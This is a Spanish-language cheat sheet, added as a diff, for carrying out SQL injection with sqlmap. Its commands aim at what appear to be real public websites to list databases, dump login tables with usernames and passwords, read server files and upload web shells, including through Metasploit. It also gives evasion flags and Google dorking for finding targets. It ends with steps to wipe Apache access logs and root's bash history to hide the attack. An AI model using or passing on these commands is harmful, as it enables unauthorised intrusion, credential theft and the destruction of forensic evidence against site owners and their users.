@@ -1,0 +1,95 @@
+1.- probar con la sentencia sql en un input para probar si hay errores sql ('or'=) o tambien probar con  ('or' '=')
+2.-comilla antes de cualquier valor de variable id='4   para buscar un error sql
+3.-sqlmap -u http://perro.hol.es/busqueda.php --data="id=4&region=perro&id_reg=35" -p "id" --dbms=MySQL --level=3 --risk=3 --random-agent --tamper=space2comment --current-db -v3
+
+-u: url a utilizar
+--data: parametros post o get
+-p: parametro vulnerable
+--dbms=MySQL: buscar base de datos con tecnologia de mysql
+--level=3: (1a5) profundidad de escaneo
+--risk=3: (1a3) riesgo de escaneo
+--random-agent: busqueda aleatoria para pasar desapercibidos
+--tamper=space2comment si hay problemas de estabilidad de conexion del servidor seguira el proceso de escaneo
+--current-db: que nos arroje la base de datos que se esta usando en esta consulta
+-v3: arroja detalladamente la inyeccion que esta realizando sqlmap
+
+4.-sqlmap -u http://perro.hol.es/busqueda.php --data="id=4&region=perro&id_reg=35" -p "id" --dbms=MySQL --level=3 --risk=3 --random-agent --tamper=space2comment -D mi_base_de_datos --tables -v3
+
+5.-sqlmap -u http://perro.hol.es/busqueda.php --data="id=4&region=perro&id_reg=35" -p "id" --dbms=MySQL --level=3 --risk=3 --random-agent --tamper=space2comment -D mi_base_de_datos -T login --columns -v3
+
+6.-sqlmap -u http://perro.hol.es/busqueda.php --data="id=4&region=perro&id_reg=35" -p "id" --dbms=MySQL --level=3 --risk=3 --random-agent --tamper=space2comment -D mi_base_de_datos -T login -C usuario,password --dump -v3
+
+
+7.-borra los log de los ataques que hiciste... ve a la direccion /var/log/apache2 y lista los archivos
+8.-cat /dev/null > access.log   con esto ya estaria limpio
+9.-tambien ve a /root/ y has un "ls -a" para ver todos los archivos ocultos
+10.-cat /dev/null > .bash_history y borreras su contenido
+
+
+*********************************************************************************************************
+
+--common-tables --common-columns: encontrar las tablas y columnas mediante un diccionario (encuentra credenciales del panel de administracion)
+--privileges: obtener los privilegios con el que el usuario se comunica con la base de datos
+--current-user: nombre de usuario con elque se accede a la base de datos
+--is-dba: ver si es vulnerable a la subida de shell, si es true entonces es vulnerable
+--sql-shell: subir shell mediante sqlmap, primero pegas la shell en base 64 (one liner php) y luego pones el path donde esta la pagina 
+	(ej kali var/www/html) recuerda que pudiera estar en diferentes sitios, especialmente si es un servidor que almacena muchas paginas, 
+	para ello puedes usar [] o ! y quizas nos la de... si no lo sabes lo intentara con un diccionario
+***siempre usas la comilla ' para que de el error, pero si usas [] o ! ademas del error podria darte el directorio
+--os-pwn: te permite ingresar una shell, pero mediante metasploit, recuerda que el dba debe ser true
+--wizard: una interfaz que te guia al usar sqlmap... te pide los parametros uno por uno
+--dbs --batch: hara que sqlmap no te haga preguntas y todas sean seleccionadas por default (ej y/N) se usara la mayuscula N
+-g php?id=: buscaras paginas usando una dork y podras testearla de inmediato
+--user-agent: simular un explorador especifico (--user-agent "Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; 	+http://www.become.com/site_owners.html)")
+
+
+sqlmap -u 'http://sniper.cl/index.php?id=VerCategoria&Cat=9' -D sniper_sitio --common-tables --common-columns  
+ENTREGA LA TABLA CON LAS CREDENCIALES DEL PANEL DE ADMINISTRACION
+
+sqlmap -u 'http://sniper.cl/index.php?id=VerCategoria&Cat=9' --privileges 
+ENTREGA LOS PRIVILEGIOS DEL USUARIO CON EL QUE SE INGRESA EL REGISTRO EN LA BASE DE DATOS
+
+sqlmap -u 'http://sniper.cl/index.php?id=VerCategoria&Cat=9' --current-user 
+NOMBRE DEL USUARIO CON EL QUE SE ESTA MANEJANDO LA BASE DE DATOS
+
+sqlmap -u 'http://sniper.cl/index.php?id=VerCategoria&Cat=9' --is-dba
+ENTREGA SI ES VULNERABLE A LA INYECCION DE UNA SHELL MEDIANTE SQLMAP (SI ES TRUE SE PUEDE) 
+
+sqlmap -u 'http://sniper.cl/index.php?id=VerCategoria&Cat=9' --sql-shell
+SUBIR LA SHELL, SOLO SI EL DBA ES TRUE... NECESITAS PRIMERO INGRESAR LA SHELL EN BASE 64 Y LUEGO DEBES PONER EL PATH (EN KALI var/www/html) O PUEDE SER VERIFICADA POR DICCIONARIO
+
+sqlmap -u 'http://sniper.cl/index.php?id=VerCategoria&Cat=9' --os-pwn
+INGRESAR SHELL PERO MEDIANTE METASPLOIT, RECUERDA QUE EL DBA DEBE SER TRUE
+
+PARA BUSCAR LA RUTA EN VEZ DE PONER COMILLA ' EN LA VARIABLE Y QUE ARROJE EL ERROR PONES [] O ! (EJEMPLO PERRO.PHP?id=[]45) o (PERRO.PHP?id=!45) ESTA RUTA TE SIRVE PARA SUBIR LA SHELL
+
+sqlmap --wizard
+ES PARA QUE SQLMAP TE GUIE CON TODO EL PROCESO... PIDIENDOTE CADA UNO DE LOS PARAMETROS DEL ATAQUE
+
+sqlmap -u 'http://sniper.cl/index.php?id=VerCategoria&Cat=9' --dbs --batch
+CON ESTE PARAMETRO NO SE TE HARAN PREGUNTAS DURANTE EL PROCESO, SIEMPRE SE ELEGIRA POR DEFAULT LA LETRA MAYUSCULA (EJEMPLO y/N)
+
+sqlmap -g php?id=
+BUSQUEDA DE PAGINAS MEDIANTE DORK, SOLO INGRESA EL DORK Y PODRAS TESTEAR CADA UNA DE LAS QUE APAREZCAN
+
+*********************************************************************************************************
+
+
+
+http://sniper.cl/index.php?id=VerCategoria&Cat=10
+
+python sqlmap.py -u http://tester.ed/visitantes.php?id=319 --random-agent --dbms=MySql --is-dba
+
+python sqlmap.py -u http://tester.ed/visitantes.php?id=319 --random-agent --dbms=MySql --
+
+python sqlmap.py -u http://tester.ed/visitantes.php?id=319 --random-agent --dbms=MySql --dbs
+
+python sqlmap.py -u http://tester.ed/visitantes.php?id=319 --random-agent --dbms=MySql -D tester --sql-query="SELECT id,ip,user_agent FROM `visitantes` where id = 4" 
+
+python sqlmap.py -u http://tester.ed/visitantes.php?id=319 --random-agent --file-read "C:\xampp\tester\conexion.php"
+
+
+root@kali:/tmp/sqlmap# python sqlmap.py -u "http://172.16.93.132/test_environment/mysql/get_int.php?id=1" --file-read "c:\xampp\apache\logs\access.log"
+
+
+./sqlmap.py -u "http://192.168.56.101/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie "security=medium; PHPSESSID=f7dn85m8g8ad502k9bl1mmonq3" -p id --risk 3 --level 3 --thread 8 --dbms MySQL --dbs
